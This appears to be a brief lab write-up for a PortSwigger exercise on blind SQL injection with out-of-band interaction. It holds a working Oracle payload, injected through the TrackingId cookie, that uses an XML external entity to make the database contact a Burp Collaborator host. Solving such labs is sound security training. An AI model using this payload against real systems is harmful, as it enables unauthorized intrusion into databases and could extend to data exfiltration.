# [Lab: Blind SQL injection with out-of-band interaction](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band)

## Lab

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.

## manual

1. Blind sqli detection based on time delay:
    - all fail
2. Blind sqli detection based on OOB interaction, `copy to clipboard` a collaborator subdomain:
    - oracle: `TrackingId='+OR+'1'%3d'1'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--;`
    - => Lab Solved
